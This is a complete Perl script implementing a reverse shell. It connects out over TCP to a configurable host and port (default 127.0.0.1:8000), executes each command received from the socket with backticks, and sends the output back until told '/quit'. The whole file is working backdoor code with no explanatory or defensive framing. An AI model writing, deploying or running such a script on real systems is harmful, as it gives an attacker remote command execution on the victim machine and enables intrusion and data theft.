#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;

package ReverseShell;

sub new {
    my($class, $host, $port) = @_;
    my $self = {_host => $host || '127.0.0.1', _port => $port || 8000};
    return bless $self, $class;
}

sub connect2server {
    my $self = shift;
    $self->{_socket} = IO::Socket::INET->new(
        Proto => 'tcp',
        PeerAddr => $self->{_host},
        PeerPort => $self->{_port}
    ) or die "[!!] Cannot connect to server: $!\n";
}

sub run {
    my $self = shift;
    $self->connect2server();
    while() {
        $self->{_socket}->recv(my $cmd, 1024);
        chomp($cmd);
        return if $cmd eq '/quit';
        my $result = `$cmd`;
        $self->{_socket}->send($result);
    }
}


package main;

my $shell = new ReverseShell();
$shell->run()
